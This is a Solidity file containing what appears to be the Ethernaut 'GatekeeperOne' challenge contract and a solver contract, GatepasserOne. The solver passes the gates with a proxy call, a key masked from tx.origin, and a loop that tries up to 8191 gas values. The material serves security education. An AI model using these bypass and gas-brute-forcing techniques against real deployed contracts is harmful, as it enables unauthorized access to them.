// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatepasserOne {
    address instance;
    bytes8 keySetup;

    constructor(address _instance) {
        instance = _instance;
    }

    function start() external {
        // take last two bytes from address for gateThree parts one and three, non-zero data in first 4 bytes for gateThree part two.
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xF00000000000FFFF;
        uint gas = 10000;

        for (uint i=0;i<8191;i++) {
            gas += i;

            try GatekeeperOne(instance).enter{gas:gas}(key) returns (bool) {
                break;
            }
            catch { }
        }
    }
}